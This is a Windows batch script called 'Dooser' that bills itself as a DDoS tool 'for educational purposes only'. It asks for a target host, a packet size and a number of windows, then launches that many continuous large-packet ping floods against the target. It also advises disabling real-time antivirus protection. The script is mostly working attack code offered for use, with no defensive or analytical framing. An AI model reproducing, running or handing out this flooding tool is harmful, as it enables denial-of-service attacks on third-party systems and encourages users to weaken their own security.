@echo off
mode 117, 28
title ~ Dooser ~
cls
color f
echo.
set hrs=%time:~0,2%
set mns=%time:~3,2%
set scs=%time:~6,2%
set mls=%time:~9,2%
set nmt=%time:~0,8%
echo.
Call :Color 04 "                                     This is DDoSer coded in batch. It's simple."
echo.
call :Color 00 "                     "
Call :Color 60 "FOR EDUCATIONAL PURPOSES ONLY. By using this program you accept my disclaimer."
echo.
Call :Color 01 "                              Disclaimer can be found here: ("
Call :Color 05 "https://dooser.zscopuv.tk/"
Call :Color 01 ")
echo.
echo.
Call :Color 03 "                                       Current Version/Branch: "
Call :Color 13 "release-1"
echo.
echo.
goto main
:Color

SetLocal EnableExtensions EnableDelayedExpansion
Set "Text=%~2"
If Not Defined Text (Set Text=^")
Subst `: "!Temp!" >Nul &`: &Cd \
If Not Exist `.7 (
Echo(|(Pause >Nul &Findstr "^" >`)
Set /P "=." >>` <Nul
For /F "delims=;" %%# In (
'"Prompt $H;&For %%_ In (_) Do Rem"') Do (
Set /P "=%%#%%#%%#" <Nul >`.3
Set /P "=%%#%%#%%#%%#%%#" <Nul >`.5
Set /P "=%%#%%#%%#%%#%%#%%#%%#" <Nul >`.7))
Set /P "LF=" <` &Set "LF=!LF:~0,1!"
For %%# in ("!LF!") Do For %%_ In (
\ / :) Do Set "Text=!Text:%%_=%%~#%%_%%~#!"
For /F delims^=^ eol^= %%# in ("!Text!") Do (
If #==#! SetLocal DisableDelayedExpansion
If \==%%# (Findstr /A:%~1 . \` Nul
Type `.3) Else If /==%%# (Findstr /A:%~1 . /.\` Nul
Type `.5) Else (Echo %%#\..\`>`.dat
Findstr /F:`.dat /A:%~1 .
Type `.7))
If "\n"=="%~3" (Echo()
Goto :Eof

:main
Call :Color 03 "          TARGET "
echo.
Call :Color 0a "          If you wish to use domain, not with "
Call :Color 03 "HTTPS:// "
Call :Color 0a "or "
Call :Color 03 "HTTP://"
echo.
Call :Color 0a "          EXAMPLE: "
Call :Color 0f "[IP] > " 
Call :Color 03 "www.example.com"
echo.
echo.
set /p ip=[IP] ^> 
echo.
Call :Color 03 "          PACKETS (For sucessfull attack use "
Call :Color 02 "1200 "
Call :Color 03 "or lower)"
echo.
echo.
set /p packets=[PACKETS] ^> 
echo.
Call :Color 03  "          ATTACK POWER"
echo.
Call :Color 0c  "          WARNING - SETTING THIS VALUE HIGH OPENS LOTS OF WINDOWS, THAT CAN LAG YOUR PC!"
echo.
Call :Color 0c  "          Also setting this higher than 5 requires ADMIN UAC - Admin perms 
echo.
Call :Color 0c  "          (Or you can disable REAL-TIME PROTECTION)"
echo.
echo.
set /p windowsOpen=[WinPOWER] ^> 
echo.
Call :Color 04  "          SENDING PACKETS"
echo.
Call :Color 04  "          KEEP WINDOWS OPEN, OTHERWISE ATTACK WILL BE STOPPED." 
echo.
Call :Color 02  "          IF YOU WANT TO STOP - RUN "
Call :Color 06  "'TASKKILL /IM CMD.EXE /F' "
Call :Color 02  "or close all TCP/IP PING COMMAND windows"
echo.
Call :Color 00 " . "
Call :Color 07 " . "
Call :Color 00 " . "
Call :Color 07 " . "
ping localhost -n 3 >nul
@echo off
for /L %%a in (1,1,%windowsOpen%) do (

start ping %ip% -t -l %packets% 

)